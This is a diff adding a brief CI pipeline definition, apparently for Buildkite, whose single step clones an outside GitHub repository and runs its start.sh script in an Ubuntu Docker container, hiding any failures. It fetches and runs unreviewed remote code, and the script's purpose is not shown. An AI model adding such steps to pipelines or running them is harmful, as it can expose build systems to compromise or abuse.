@@ -1,0 +1,15 @@
+steps:
+  - label: "Run Script in Docker"
+    command:
+      - "git clone https://github.com/Fiujol/android || true"
+      - "cd android"
+      - "bash start.sh 8 || echo 'Script failed'"
+    agents:
+      queue: "default"
+    container:
+      image: "ubuntu:22.04"
+    plugins:
+      - docker#v3.4.0:
+          image: "ubuntu:22.04"
+          volumes:
+            - /tmp:/tmp
